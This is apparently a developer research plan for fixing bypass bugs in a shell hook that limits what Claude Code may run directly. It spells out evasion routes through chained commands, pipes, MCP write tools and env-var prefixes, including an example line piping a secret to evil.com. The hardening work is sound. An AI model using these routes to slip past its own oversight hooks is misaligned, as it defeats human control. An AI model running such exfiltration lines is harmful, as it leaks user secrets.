# Phase 10: Enforcer Hardening + Helper Extraction — Research

**Researched:** 2026-04-24
**Domain:** Bash security hooks / shell command classification / Claude Code PreToolUse hooks
**Confidence:** HIGH (all claims verified against live codebase and test suite)

---

## Summary

Phase 10 fixes 6 known security bugs in `forge-delegation-enforcer.sh`, codifies the doc-edit
path allowlist as a hook-level check, extracts helper functions to `hooks/lib/enforcer-utils.sh`,
expands the test suite, and bumps `plugin.json` to v1.3.0.

The enforcer is the primary security boundary preventing Claude from bypassing Forge delegation.
Every fix in this phase must not introduce new bypass paths. The existing test suite (14 suites,
all green at baseline) provides the regression safety net; all existing tests must pass after changes.

The 6 bugs are confirmed by direct function-level analysis of the live enforcer source. Bug root
causes, fix strategies, and test patterns are documented below with verified code evidence.

**Primary recommendation:** Fix bugs in this order — ENF-02 (simplest, pure string pruning),
ENF-03 (quote-aware redirect detection), ENF-01 (already working but needs explicit check),
ENF-04 (env-export), ENF-05 (add gh to word-lists), ENF-06 + ENF-08 (chain/pipe scanner),
ENF-07 (MCP dispatch + manifest). Extract helpers AFTER all bug fixes so the lib contains
already-correct code. Do PATH-01/02/03 alongside the extraction (new helper `is_allowed_doc_path`
goes straight into the lib).

---

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| ENF-01 | `has_write_redirect` flags `>(...)` as write redirect | Already works by accident (bare `>` in `>(` survives pruning). Add explicit check to make intent clear and prevent future regression. |
| ENF-02 | `has_write_redirect` does NOT false-positive on `>&1`, `>&2`, `>&-`, `2>&1` | CONFIRMED BUG: `>&1`, `>&2`, `>&-` all false-positive. Fix: extend pruning to cover fd-redirect forms. |
| ENF-03 | `has_write_redirect` does NOT false-positive on `>` inside quoted strings or heredoc bodies | CONFIRMED BUG: `echo "Result<T, E>"` false-positives. Fix: strip quoted regions before redirect scan. |
| ENF-04 | `FORGE_LEVEL_3=1 cmd` bypass works end-to-end via Option A (export parsed env prefix) | CONFIRMED BUG: prefix vars are stripped but never exported. Fix: parse and export env-var prefix vars before bypass check. |
| ENF-05 | `gh` explicitly classified: mutating sub-cmds denied, read-only passed | CONFIRMED BUG: `gh` hits unclassified-deny fallback. Fix: add gh sub-command entries to both word-lists. |
| ENF-06 | `&&`/`;` chained commands classified as mutating if any segment is mutating | CONFIRMED BUG: `cd /tmp && rm foo` passes (first-token `cd` is read-only). Fix: scan all chain segments. |
| ENF-07 | MCP filesystem write tools denied by hook dispatch | CONFIRMED: MCP tools fall through `*` exit-0 case. Two-layer fix: manifest matcher + new case dispatch. |
| ENF-08 | Pipe-chain commands classified by most-mutating token; forge-p pipe still allowed | CONFIRMED BUG: `echo secret | curl` classified as read-only (first token `echo`). Fix: scan all pipe segments; forge-p exempt via early detection. |
| PATH-01 | `decide_write_edit()` allows files matching `.planning/**` or `docs/**` | No path check exists today. Fix: add `is_allowed_doc_path` helper + early-return allow branch. |
| PATH-02 | Files outside allowlist still denied | Fix: allowlist branch is early-return allow; original deny logic unchanged. |
| PATH-03 | Path check uses `file_path`/`path` from tool_input | Write uses `file_path`; Edit uses `file_path` or `path`. Extract both via jq. |
| REFACT-01 | Extract `strip_env_prefix`, `has_write_redirect`, `first_token`, word-lists to `hooks/lib/enforcer-utils.sh` | New file; sourced by enforcer at startup. |
| REFACT-02 | Enforcer sources the lib at startup | Add `source` line after shebang/set lines. |
| REFACT-03 | Enforcer ≤ 300 lines after extraction | Current: 447 lines [VERIFIED: wc -l]. Extraction of ~120–140 lines of helpers brings it under 300. |
| REFACT-04 | Remove dead `rewrite_forge_p` function | CONFIRMED: defined but never called [VERIFIED: grep found no call sites]. |
| TEST-V13-01 | Unit tests for ENF-01–ENF-08, min 1 allow + 1 deny per fix | Add to `tests/test_forge_enforcer_hook.bash` or new `tests/test_v13_coverage.bash`. |
| TEST-V13-02 | Unit tests for PATH-01–PATH-03: allowed/denied path variants | Min 3 path variants per allowlist pattern. |
| TEST-V13-03 | All existing v1/v1.2 tests pass after refactoring | Baseline: 14 suites, 0 failures [VERIFIED]. One test must be INVERTED (see below). |
| TEST-V13-04 | `enforcer-utils.sh` independently sourceable in tests | Source-guard pattern required. |
| MAN-V13-01 | `plugin.json` version = `1.3.0` | Bump from `1.2.4` [VERIFIED: current version]. |
| MAN-V13-02 | `plugin.json` PreToolUse matcher includes MCP filesystem tools | Add 4 MCP tool names to pipe-separated matcher. |
| MAN-V13-03 | `plugin.json` `_integrity` SHA-256 hashes updated for all changed files | `shasum -a 256` after every file change. |
</phase_requirements>

---

## Architectural Responsibility Map

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| Command classification (read-only/mutating) | Hook / Shell | — | Must run synchronously before tool executes |
| Redirect detection | Hook / Shell | — | Regex-based text analysis in Bash |
| Path allowlist | Hook / Shell | — | File path check from tool_input JSON |
| MCP tool blocking | Hook dispatch + plugin.json matcher | — | Two-layer: manifest registers; hook decides |
| Helper library | `hooks/lib/` | — | Sourced file, not a separate process |
| Test suite | `tests/` | — | bats-style bash test scripts |
| Plugin manifest | `.claude-plugin/plugin.json` | — | Claude Code reads this at plugin load |

---

## Project Constraints (from CLAUDE.md)

- Stack: Shell / Bash + Markdown
- Git repo: https://github.com/alo-exp/sidekick.git
- All project instructions override defaults
- GSD workflow runs in yolo mode — no prompting on sub-agent spawns

---

## Bug Analysis (Verified Against Live Code)

### Bug Inventory

The enforcer currently has 447 lines [VERIFIED: `wc -l hooks/forge-delegation-enforcer.sh`].
No `rewrite_forge_p` call site exists anywhere in the file [VERIFIED: `grep` found function defined but never called].
All 14 test suites pass at baseline [VERIFIED: `bash tests/run_all.bash` → 0 failures].

---

### ENF-01: `has_write_redirect` — Process Substitution

**Status [VERIFIED: direct function test]:**
`has_write_redirect "tee >(cat)"` → correctly flagged (returns 0).
`has_write_redirect "cmd >(tee log)"` → correctly flagged (returns 0).

The process substitution `>(...)` is already caught because the bare `>` character in `>(` survives
all current pruning rules. ENF-01 technically "works by accident" — the requirement asks for
EXPLICIT flagging to make the intent clear and prevent future pruning rules from accidentally
removing the `>` from `>(`.

**Fix: add an explicit early check:**
```bash
# ENF-01: process substitution >(cmd) is a write redirect
[[ "$cmd" == *">("[^)]*")"* ]] && return 0
```
Place before the pruning loop.

---

### ENF-02: `has_write_redirect` — FD-Redirect False Positives

**Current code (lines 285–301):**
```bash
has_write_redirect() {
  local cmd="$1"
  [[ "$cmd" == *">"* ]] || return 1
  local pruned="$cmd"
  pruned="${pruned//>\/dev\/null/}"
  pruned="${pruned//> \/dev\/null/}"
  pruned="${pruned//>> \/dev\/null/}"
  pruned="${pruned//>>\/dev\/null/}"
  pruned="${pruned//2>&1/}"
  pruned="${pruned//2>\/dev\/null/}"
  pruned="${pruned//2> \/dev\/null/}"
  [[ "$pruned" == *">"* ]]
}
```

**Confirmed false-positives [VERIFIED: direct function invocation]:**
- `some_cmd >&1` → `pruned` retains `>&1` → `>` still present → false-positive CONFIRMED
- `some_cmd >&2` → same → false-positive CONFIRMED
- `some_cmd >&-` → same → false-positive CONFIRMED
- `some_cmd 2>&1` → removed by existing `${pruned//2>&1/}` rule → correctly passes

Root cause: the pruning loop removes `2>&1` but NOT the general forms `>&N`, `>&-`, `N>&M`
(fd-to-fd redirects that route output without writing to files).

**Fix strategy:**
Extend the pruning loop to remove fd-redirect forms before the final `>` check:
```bash
pruned="${pruned//>&[0-9]/}"    # >&1, >&2, etc.
pruned="${pruned//>&-/}"        # >&- (close stdout)
pruned="${pruned//[0-9]>&[0-9]/}"  # N>&M forms
pruned="${pruned//[0-9]>&-/}"   # N>&- (close fd N)
```

**Bash compatibility note [ASSUMED]:** Bash `${var//[0-9]/}` uses glob-style character classes,
not regex. This works in bash 4+ and bash 3.2+. If `[0-9]` in parameter expansion is unreliable
on macOS bash 3.2, use explicit patterns: `>&0`, `>&1`, `>&2`, `>&3` in a loop.

---

### ENF-03: `has_write_redirect` — Quoted-String False Positives

**Confirmed false-positives [VERIFIED: direct function invocation]:**
- `echo "Result<T, E>"` → `>` inside double-quoted string → false-positive CONFIRMED
- `grep '<pattern>' file` → `>` inside single-quoted string → false-positive CONFIRMED

Root cause: the function scans the raw command string with no quote-awareness. A `>` anywhere in
the string triggers the "has redirect" path.

**Fix strategy:**
Strip quoted regions before the redirect scan:
```bash
has_write_redirect() {
  local cmd="$1"
  [[ "$cmd" == *">"* ]] || return 1
  # Strip content inside double and single quotes before redirect scan.
  # This removes false-positives from generics, comparison operators, etc.
  local unquoted
  unquoted="$(printf '%s' "$cmd" | sed "s/\"[^\"]*\"//g; s/'[^']*'//g")"
  # Now apply pruning on the unquoted version
  local pruned="$unquoted"
  # ... (existing pruning rules applied to $pruned) ...
}
```

Note: heredoc bodies (`<< EOF ... EOF`) are harder to strip reliably in pure bash without
spawning a full parser. For the scope of this fix, stripping double/single quotes covers the
stated requirement. A comment noting the heredoc limitation is appropriate.

---

### ENF-04: `FORGE_LEVEL_3=1` Env-Var Prefix Bypass Broken

**Root cause [VERIFIED: code trace and direct test]:**
`strip_env_prefix "FORGE_LEVEL_3=1 rm foo"` → returns `rm foo`.
The env-var prefix is parsed as text and discarded — never exported into the hook's shell.

The bypass check at line 391:
```bash
if [[ "${FORGE_LEVEL_3:-}" == "1" ]]; then
  return 0  # Level-3 passthrough
fi
```
reads from the hook process's environment, not from the command text. When Claude Code invokes
the hook as a subprocess, `FORGE_LEVEL_3` is not set in its environment. The command prefix
`FORGE_LEVEL_3=1` exists only in the `tool_input.command` string.

**Existing test passes but tests the WRONG path:**
`test_mutating_bash_level3_passthrough` invokes `FORGE_LEVEL_3=1 bash "${HOOK_FILE}" ...` — this
sets `FORGE_LEVEL_3=1` in the hook's own environment, so the check works. The broken path is
`{"command": "FORGE_LEVEL_3=1 rm foo"}` (prefix inside command text, not set in env).

**Fix strategy — Option A (required by ENF-04 spec):**
Add `export_env_prefix` helper that parses and exports the command-text env-var prefix vars:

```bash
# New helper: parse and export env-var prefix assignments so FORGE_LEVEL_3
# and similar vars are visible to the bypass check.
export_env_prefix() {
  local cmd="$1"
  while [[ "$cmd" =~ ^[[:space:]]*([A-Za-z_][A-Za-z0-9_]*)=([^[:space:]]*)([[:space:]]+) ]]; do
    export "${BASH_REMATCH[1]}=${BASH_REMATCH[2]}"
    cmd="${cmd#"${BASH_REMATCH[0]}"}"
  done
}
```

Call at the top of `decide_bash`, before any classification:
```bash
decide_bash() {
  local tool_input_json cmd
  # ...
  export_env_prefix "$cmd"   # exports FORGE_LEVEL_3 etc. into hook environment
  # ... rest of decide_bash unchanged ...
}
```

Security scope: `export_env_prefix` only affects the hook's own short-lived subprocess. The
anchored regex only matches `[A-Za-z_][A-Za-z0-9_]*` variable names — no shell metacharacter
injection is possible through the name. Values are exported as literal strings.

---

### ENF-05: `gh` CLI Unclassified → Hits Conservative Deny

**Root cause [VERIFIED: word-list analysis and direct function test]:**
`first_token "gh issue list"` → returns `gh issue`.
`first_token "gh pr view 1"` → returns `gh pr`.
`first_token "gh label list"` → returns `gh label`.

The two-word `case` in `is_read_only` covers only `git *` and `forge *` patterns.
The single-word `case` in `is_read_only` does not include `gh`.
Result: all `gh` commands fall through to the "4. Unclassified → conservative deny" branch,
blocking Brain-role inspection work (e.g., `gh issue list`, `gh pr view`).

**Fix strategy:**
Add `gh` sub-command classification to both `is_read_only` and `is_mutating`:

In `is_read_only` two-word case:
```bash
"gh issue list"|"gh issue view"|"gh pr list"|"gh pr view"|"gh pr status"|"gh pr checks" \
|"gh label list"|"gh release list"|"gh repo view"|"gh project list" \
|"gh run list"|"gh run view"|"gh workflow list") return 0 ;;
```

In `is_mutating` two-word case:
```bash
"gh issue create"|"gh issue edit"|"gh issue close"|"gh issue delete" \
|"gh pr create"|"gh pr merge"|"gh pr close"|"gh pr edit" \
|"gh release create"|"gh release delete"|"gh release upload" \
|"gh project item-add"|"gh project item-edit" \
|"gh repo clone"|"gh repo fork") return 0 ;;
```

Sub-commands not in either list continue to hit the unclassified-deny fallback — this is
correct conservative behavior. The lists cover all sub-commands referenced in CLAUDE.md backlog
filing workflow and the Sidekick codebase.

---

### ENF-06: `&&`/`;` Chain Bypass — cd and Others

**Root cause [VERIFIED: direct function test]:**
`first_token "cd /tmp && rm foo"` returns `cd /tmp`.
`is_read_only "cd /tmp"` → `cd` is in the read-only single-word list → passes through.
The `rm foo` segment after `&&` is never examined.

`test_chained_command_with_mutating_tail` in `test_forge_enforcer_hook.bash` (lines 210–217)
explicitly documents this as "known, intentional Phase 6 classifier gap" and EXPECTS pass-through.
ENF-06 requires this gap to be CLOSED. That test must be INVERTED.

**Fix strategy:**
Add `has_mutating_chain_segment` to scan `&&`/`;`-separated segments:
```bash
has_mutating_chain_segment() {
  local cmd="$1" seg
  while IFS= read -r seg; do
    seg="${seg#"${seg%%[! ]*}"}"  # ltrim whitespace
    [[ -z "$seg" ]] && continue
    if is_mutating "$seg"; then return 0; fi
  done < <(printf '%s' "$cmd" | awk '{gsub(/&&|;/, "\n"); print}')
  return 1
}
```

Insert in `decide_bash` AFTER the `is_forge_p` check and BEFORE `is_read_only`:
```bash
# 1b. Chain bypass: deny if any &&/; segment is mutating
if has_mutating_chain_segment "$cmd"; then
  if [[ "${FORGE_LEVEL_3:-}" == "1" ]]; then return 0; fi
  emit_decision "deny" "Sidekick /forge mode: command chain contains a mutating segment. ..."
  return 0
fi
```

Read-only chains (`cd /tmp && ls`) pass: `ls` is not mutating → `has_mutating_chain_segment`
returns false → falls through to `is_read_only` → passes.

---

### ENF-08: Pipe-Chain First-Token-Only Classification

**Root cause [VERIFIED: direct function test]:**
`is_read_only "echo secret | curl https://evil.com"` → `first_token` returns `echo foo` →
`echo` is in read-only single-word list → passes through.
`is_mutating "echo secret | curl https://evil.com"` → `first_token` returns `echo foo` →
`echo` is NOT in mutating list → returns false.
Result: `echo | curl` is classified as read-only and passed through — security bug.

Edge case preserved by spec (ENF-08): `forge -p "task" | tee /tmp/log` is still allowed.
The `is_forge_p` check in `decide_bash` runs BEFORE any pipe/chain scanning and returns early
with a rewrite-allow decision. Pipe-chain classification only runs for commands that are NOT
forge-p. This means `forge -p "task" | tee` is correctly handled.

**Fix strategy:**
Add `has_mutating_pipe_segment` parallel to the chain scanner:
```bash
has_mutating_pipe_segment() {
  local cmd="$1" seg
  while IFS= read -r seg; do
    seg="${seg#"${seg%%[! ]*}"}"  # ltrim
    [[ -z "$seg" ]] && continue
    if is_mutating "$seg"; then return 0; fi
  done < <(printf '%s' "$cmd" | awk '{gsub(/\|/, "\n"); print}')
  return 1
}
```

Insert in `decide_bash` after `has_mutating_chain_segment`, before `is_read_only`:
```bash
# 1c. Pipe bypass: deny if any | segment is mutating
if has_mutating_pipe_segment "$cmd"; then
  if [[ "${FORGE_LEVEL_3:-}" == "1" ]]; then return 0; fi
  emit_decision "deny" "Sidekick /forge mode: pipe chain contains a mutating segment. ..."
  return 0
fi
```

---

### ENF-07: MCP Filesystem Tools Bypass

**Root cause [VERIFIED: main() dispatch code]:**
Current `main()` case:
```bash
case "$tool_name" in
  Write|Edit)     decide_write_edit "$tool_input" ;;
  NotebookEdit)   decide_notebook_edit "$tool_input" ;;
  Bash)           decide_bash "$tool_input" ;;
  *)              exit 0 ;;
esac
```
`mcp__filesystem__write_file` and similar tools fall into `*` → silent pass-through.

**Two-layer fix required (both must be done in the same wave):**

Layer 1 — `plugin.json` PreToolUse matcher (MAN-V13-02):
The matcher must include MCP tool names so the hook is even invoked for these tools.
```json
"matcher": "Write|Edit|NotebookEdit|Bash|mcp__filesystem__write_file|mcp__filesystem__edit_file|mcp__filesystem__move_file|mcp__filesystem__create_directory"
```

Layer 2 — `main()` case in enforcer:
```bash
mcp__filesystem__write_file|mcp__filesystem__edit_file|\
mcp__filesystem__move_file|mcp__filesystem__create_directory)
  decide_mcp_write "$tool_input" ;;
```

`decide_mcp_write` implementation:
```bash
decide_mcp_write() {
  local tool_input_json="$1"
  local file_path
  file_path="$(printf '%s' "$tool_input_json" | jq -r '.path // .file_path // empty')"
  if is_allowed_doc_path "$file_path"; then
    return 0  # path allowlist: pass-through for .planning/** and docs/**
  fi
  deny_direct_edit
}
```

**MCP matcher format [ASSUMED: Medium confidence]:** The existing matcher `"Write|Edit|NotebookEdit|Bash"` uses
pipe-separated tool names. It is assumed MCP tool names (`mcp__filesystem__*`) work in the same
format. This follows the documented Claude Code plugin spec pattern but was not independently
verified against live MCP registration in this session.

---

### PATH-01/02/03: Doc-Edit Path Allowlist

**Current behavior [VERIFIED: decide_write_edit code, line 98]:**
```bash
decide_write_edit()    { deny_direct_edit; }
```
No path check exists. All Write/Edit calls are denied unconditionally.

**Fix strategy:**
```bash
is_allowed_doc_path() {
  local path="$1"
  [[ -z "$path" ]] && return 1
  path="${path#./}"  # normalize: strip leading ./
  [[ "$path" == .planning/* ]] && return 0
  [[ "$path" == docs/* ]] && return 0
  return 1
}

decide_write_edit() {
  local tool_input_json="$1"
  local file_path
  # Write uses file_path; Edit uses file_path or path
  file_path="$(printf '%s' "$tool_input_json" | jq -r '.file_path // .path // empty')"
  if is_allowed_doc_path "$file_path"; then
    return 0  # planning/docs edits pass through
  fi
  deny_direct_edit
}
```

`decide_notebook_edit` is NOT modified — notebook files are not in `.planning/**` or `docs/**`.

---

## Helper Extraction (REFACT-01–04)

### Functions to Extract to `hooks/lib/enforcer-utils.sh`

**Confirmed extractable [VERIFIED: line-by-line audit of enforcer source]:**

| Function | Current Lines | Dependencies | Notes |
|----------|--------------|-------------|-------|
| `strip_env_prefix` | 222–228 | none | Pure string ops |
| `export_env_prefix` | NEW (ENF-04 fix) | none | Companion to strip |
| `has_write_redirect` | 285–301 | none | Bug-fixed version (ENF-01/02/03) |
| `first_token` | 231–238 | `strip_env_prefix` | Must extract after strip |
| `is_allowed_doc_path` | NEW (PATH fix) | none | New helper |
| `has_mutating_chain_segment` | NEW (ENF-06 fix) | `is_mutating` | Chain scanner |
| `has_mutating_pipe_segment` | NEW (ENF-08 fix) | `is_mutating` | Pipe scanner |
| `is_read_only` | 255–282 | `first_token`, `has_write_redirect` | Full function |
| `is_mutating` | 303–327 | `first_token`, `has_write_redirect` | Full function |

**Functions that STAY in the enforcer:**
- `gen_uuid`, `validate_uuid` (UUID-specific, enforcer-only)
- `emit_decision` (output format, enforcer-specific)
- `deny_direct_edit`, `decide_write_edit`, `decide_notebook_edit`, `decide_mcp_write`
- `resolve_forge_dir`, `ensure_forge_dir_and_idx`, `db_precheck` (audit infrastructure)
- `extract_task_hint`, `append_idx_row` (audit index)
- `has_conversation_id`, `is_forge_p` (forge-specific logic)
- `decide_bash`, `main`

**Dead function to remove (REFACT-04):**
`rewrite_forge_p` — confirmed never called [VERIFIED: grep found no call sites]. Remove
during extraction.

### `hooks/lib/enforcer-utils.sh` Structure

```bash
#!/usr/bin/env bash
# =============================================================================
# Sidekick Plugin — Enforcer Utility Library
# Sourced by hooks/forge-delegation-enforcer.sh at startup.
# Safe to source independently in tests (no side effects at source time).
# =============================================================================

# Source-guard: prevents double-sourcing in test contexts.
[[ -n "${_SIDEKICK_ENFORCER_UTILS_LOADED:-}" ]] && return 0
_SIDEKICK_ENFORCER_UTILS_LOADED=1

strip_env_prefix() { ... }
export_env_prefix() { ... }
has_write_redirect() { ... }   # ENF-01/02/03 fixed version
first_token() { ... }
is_allowed_doc_path() { ... }
has_mutating_chain_segment() { ... }
has_mutating_pipe_segment() { ... }
is_read_only() { ... }         # includes gh read-only entries (ENF-05)
is_mutating() { ... }          # includes gh mutating entries (ENF-05)
```

### Enforcer Line Count After Extraction

Current: 447 lines [VERIFIED].
Extracted to lib: ~120–140 lines (existing functions) + ~40–60 lines (new helpers).
Dead code removed (`rewrite_forge_p`): ~10 lines.
New code in enforcer (source line, new case dispatch, new calls): ~15–20 lines net addition.
Expected post-extraction: ~295–315 lines.

**Risk:** Borderline vs. the 300-line target. Mitigation: the new helper functions
(`export_env_prefix`, `is_allowed_doc_path`, `has_mutating_chain_segment`,
`has_mutating_pipe_segment`) all go into the lib — the enforcer only calls them by name.
This keeps the enforcer below 300 lines if comment verbosity is kept moderate.

### Source Line Pattern

```bash
# After set -euo pipefail and IFS declaration, before first function:
HOOK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=hooks/lib/enforcer-utils.sh
source "${HOOK_DIR}/lib/enforcer-utils.sh"
```

---

## Standard Stack

This phase is Shell/Bash only — no external library dependencies.

| Tool | Version | Purpose | Why Used |
|------|---------|---------|----------|
| `bash` | 3.2+ | Hook execution | macOS compatibility target |
| `jq` | any | JSON parsing in hook | Already required by enforcer |
| `awk` | any | Segment splitting | Portable, already used in codebase |
| `sed` | POSIX | Quote-stripping in `has_write_redirect` | Already used in progress surface |
| `shasum` | any | `_integrity` hash computation | macOS built-in, existing workflow |

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Quote-aware shell parser | Custom bash regex parser | `python3 -c 'import shlex'` | Already used for task hint extraction; handles escaping correctly |
| SHA-256 hash | Manual computation | `shasum -a 256 file \| awk '{print $1}'` | Already used in plugin integrity workflow |
| JSON construction | String concatenation | `jq -cn --arg ...` | Already used throughout; prevents injection |
| Segment splitting | Custom IFS parsing | `awk '{gsub(/&&/, "\n"); print}'` | Simpler than IFS manipulation; avoids quoting pitfalls |

---

## Common Pitfalls

### Pitfall 1: Pruning `>&1` Variants in `has_write_redirect`
**What goes wrong:** `>&1` after existing pruning still contains `>`. Adding `>&[0-9]` to the
pruning loop requires understanding bash glob classes in `${var//pattern/}`.
**Prevention:** Use `${pruned//>&[0-9]/}` — the `[0-9]` is a glob character class in bash
parameter expansion. If macOS bash 3.2 doesn't support this glob class form, use explicit
cases: `>&0`, `>&1`, `>&2`, `>&3`.
**Warning signs:** `bash /tmp/enf_test.sh` with `has_write_redirect "ls >&1"` should return 1.

### Pitfall 2: `test_chained_command_with_mutating_tail` Inversion Required
**What goes wrong:** Forgetting to update this test after ENF-06 fix. The test passes before
the fix (it expects pass-through) and FAILS after the fix (hook now denies) — creating the
appearance of a regression.
**Prevention:** Update `test_forge_enforcer_hook.bash` line ~211 in the same plan that
implements ENF-06. Change `assert_pass` to `assert_fail` and update the expected behavior.

### Pitfall 3: Two-Layer MCP Enforcement — Both Layers Required
**What goes wrong:** Adding MCP tools to the enforcer `case` dispatch but forgetting to update
`plugin.json` matcher. The hook is never invoked for MCP tools if the matcher doesn't list them.
**Prevention:** MAN-V13-02 and ENF-07 must be implemented in the same wave. Test: grep the
`plugin.json` matcher before running enforcer tests for MCP tools.

### Pitfall 4: `enforcer-utils.sh` Double-Sourcing
**What goes wrong:** Tests that source both the enforcer and the lib directly can trigger
double-source. `set -euo pipefail` in the lib causes failures on some bash versions on
re-declaration of functions.
**Prevention:** Source-guard at top of `enforcer-utils.sh`:
`[[ -n "${_SIDEKICK_ENFORCER_UTILS_LOADED:-}" ]] && return 0`

### Pitfall 5: `export_env_prefix` Security Scope
**What goes wrong:** Exporting arbitrary name=value from command text could pollute the hook
environment in unexpected ways.
**Prevention:** The hook is a short-lived subprocess. The regex `[A-Za-z_][A-Za-z0-9_]*`
accepts only valid env-var names — no shell metacharacters can sneak through. Values are
exported as literal strings, not evaluated.

### Pitfall 6: `is_allowed_doc_path` Leading-Dot Normalization
**What goes wrong:** Claude Code may pass `./planning/PLAN.md` or `.planning/PLAN.md`.
Without normalization, `[[ "$path" == .planning/* ]]` fails for `planning/PLAN.md` (missing dot).
**Prevention:** Strip leading `./` in `is_allowed_doc_path` before the glob match.

### Pitfall 7: `has_mutating_pipe_segment` and Forge Pipe Commands
**What goes wrong:** If `has_mutating_pipe_segment` runs before `is_forge_p`, then
`forge -p "task" | tee /tmp/log` would have `tee` scanned as a potential mutating command
(tee writes to files). `tee` is not in the mutating list today, but this is a fragile assumption.
**Prevention:** The `is_forge_p` check in `decide_bash` MUST remain before pipe/chain scanning.
This is already the correct order. Never reorder the `decide_bash` dispatch.

---

## Architecture Patterns

### Pattern 1: Bash Hook Source-Guard (for library files)
```bash
# At top of lib file, before any function definitions:
[[ -n "${_SIDEKICK_ENFORCER_UTILS_LOADED:-}" ]] && return 0
_SIDEKICK_ENFORCER_UTILS_LOADED=1
```

### Pattern 2: Hook Source Line in Enforcer
```bash
# After set -euo pipefail, before first function:
HOOK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=hooks/lib/enforcer-utils.sh
source "${HOOK_DIR}/lib/enforcer-utils.sh"
```

### Pattern 3: Segment Scanner (generalized)
```bash
scan_segments() {
  local cmd="$1" sep="$2" seg
  while IFS= read -r seg; do
    seg="${seg#"${seg%%[! ]*}"}"  # ltrim whitespace
    [[ -z "$seg" ]] && continue
    if is_mutating "$seg"; then return 0; fi
  done < <(printf '%s' "$cmd" | awk -v s="$sep" '{gsub(s, "\n"); print}')
  return 1
}
```
The two new helpers (`has_mutating_chain_segment`, `has_mutating_pipe_segment`) use this exact
pattern with `&&|;` and `\|` as separators respectively.

### Recommended New File Structure
```
hooks/
├── forge-delegation-enforcer.sh   # ≤300 lines after extraction
├── forge-progress-surface.sh      # unchanged (strip_ansi stays here)
├── validate-release-gate.sh       # unchanged
├── hooks.json                     # unchanged
└── lib/
    └── enforcer-utils.sh          # NEW: extracted helpers + bug-fixed functions
tests/
├── test_forge_enforcer_hook.bash  # extended: ENF-01–08 + PATH + test inversion
├── test_v13_coverage.bash         # NEW: v1.3 coverage gap tests (same pattern as test_v12_coverage.bash)
└── ... (all others unchanged)
```

`run_all.bash` must be updated to add `test_v13_coverage.bash` to the suite list.

---

## Test Strategy

### Test Framework
| Property | Value |
|----------|-------|
| Framework | Custom bash test runner (no bats dependency) |
| Config file | `tests/run_all.bash` |
| Quick run command | `bash tests/test_forge_enforcer_hook.bash` |
| Full suite command | `bash tests/run_all.bash` |

### Baseline State [VERIFIED]
All 14 test suites pass. 0 failures. `bash tests/run_all.bash` confirmed.

### Existing Test That Requires Inversion (Critical for TEST-V13-03)

`test_chained_command_with_mutating_tail` in `test_forge_enforcer_hook.bash` (lines 210–219)
currently EXPECTS pass-through for `git status && rm foo` — the Phase 6 comment explicitly
marks it as "known, intentional Phase 6 classifier gap." After ENF-06 is fixed, this test MUST
be updated to expect DENY. This is not a regression — it is an intentional behavioral change.

Failing to update this test means TEST-V13-03 fails after ENF-06 is implemented.

### Validation Architecture — Phase Requirements → Test Map

| Req ID | Behavior | Test Type | Command | File |
|--------|----------|-----------|---------|------|
| ENF-01 | `>(...)` flagged as write redirect | unit | `bash tests/test_forge_enforcer_hook.bash` | extend existing |
| ENF-02 | `>&1/>&2/>&-` NOT flagged | unit | same | extend existing |
| ENF-03 | `>` in quotes NOT flagged | unit | same | extend existing |
| ENF-04 | `FORGE_LEVEL_3=1 cmd` (as prefix) passes | unit | same | extend existing |
| ENF-05 | `gh issue list` passes; `gh issue create` denied | unit | same | extend existing |
| ENF-06 | `cd && rm` denied; `cd && ls` passes | unit | same | update + extend |
| ENF-07 | MCP write tools denied | unit | same | extend existing |
| ENF-08 | read-only pipe denied; forge-p pipe allowed | unit | same | extend existing |
| PATH-01–03 | `.planning/` and `docs/` pass; `hooks/` denied | unit | same | extend existing |
| REFACT-01–04 | lib exists; enforcer sources it; ≤300 lines | structural | `wc -l hooks/forge-delegation-enforcer.sh` | Wave 0 gap |
| TEST-V13-04 | lib sourceable in isolation | unit | `bash tests/test_v13_coverage.bash` | Wave 0 gap |
| MAN-V13-01–03 | version=1.3.0; matcher updated; hashes correct | integration | `bash tests/test_plugin_integrity.bash` | existing |

### Sampling Rate
- Per task commit: `bash tests/test_forge_enforcer_hook.bash`
- Per wave merge: `bash tests/run_all.bash`
- Phase gate: Full suite green before `/gsd-verify-work`

### Wave 0 Gaps
- [ ] `hooks/lib/enforcer-utils.sh` — create with source-guard before any refactoring plan
- [ ] `tests/test_v13_coverage.bash` — new file for TEST-V13-04 isolation tests; add to `run_all.bash`

---

## Plugin Manifest Changes

**File:** `.claude-plugin/plugin.json`
**Current version:** `1.2.4` [VERIFIED]

**Required changes:**
1. `version`: `"1.2.4"` → `"1.3.0"`
2. `hooks.PreToolUse[0].matcher`: extend with MCP filesystem tools
3. `_integrity`: recompute SHA-256 for all changed files + add new key for `enforcer-utils.sh`

**Current matcher:** `"Write|Edit|NotebookEdit|Bash"`
**Required matcher:** `"Write|Edit|NotebookEdit|Bash|mcp__filesystem__write_file|mcp__filesystem__edit_file|mcp__filesystem__move_file|mcp__filesystem__create_directory"`

**Files whose hashes must be updated:**
- `hooks/forge-delegation-enforcer.sh` (bug fixes + refactor)
- `hooks/lib/enforcer-utils.sh` (NEW — add new `enforcer_utils_sha256` key)
- `.claude-plugin/plugin.json` itself (circular — compute last after all others are final)

**Hash command (macOS):**
```bash
shasum -a 256 hooks/forge-delegation-enforcer.sh | awk '{print $1}'
shasum -a 256 hooks/lib/enforcer-utils.sh | awk '{print $1}'
shasum -a 256 .claude-plugin/plugin.json | awk '{print $1}'
```

**Note:** The `plugin.json` self-hash (circular dependency R11-3) is an accepted design
documented in SENTINEL audit. Compute the hash after all other fields are finalized, then
set the field and verify with `test_plugin_integrity.bash`.

**`test_plugin_integrity.bash` update required:**
The `check_v12_hash` loop must be extended to verify `enforcer_utils_sha256` against
`hooks/lib/enforcer-utils.sh`. The version assertion must accept `1.3.*`.

---

## Security Domain

### Applicable ASVS Categories

| ASVS Category | Applies | Standard Control |
|---------------|---------|-----------------|
| V4 Access Control | yes | Hook-level deny/allow enforcement |
| V5 Input Validation | yes | jq parsing, UUID validation, env-var regex |
| V13 API Security | partial | MCP tool name classification in matcher |

### Known Threat Patterns for this Phase

| Pattern | STRIDE | Standard Mitigation |
